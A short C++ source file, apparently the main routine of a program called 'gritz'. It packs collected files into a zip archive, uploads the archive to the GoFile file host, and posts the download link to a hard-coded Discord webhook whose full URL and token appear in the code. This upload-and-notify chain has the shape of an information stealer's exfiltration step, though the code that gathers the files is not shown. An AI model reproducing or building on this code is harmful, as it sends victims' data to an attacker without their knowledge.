#include <gritz.h>

void gritz::cGritz::Start(char** args)
{
	gritz::paths::initPaths();

	Webhook hook = Webhook("https://canary.discord.com/api/webhooks/1571868586195157013/-L9CPBnGtUkUujRNZQaawE6IkUEc_P1h9mYsoEEsB8tFUoUj4JuDi7EsRptCWXsz01");

	hook.setUsername("yo")
		.setContent(gritz::upload::GoFileUpload::upload(gritz::upload::zip::ZipFile::create("lmao")));

	hook.execute();

	//if (args[1] == nullptr)
	//{
	//}
	//else
	//{
	//}

	//std::cin.get();
}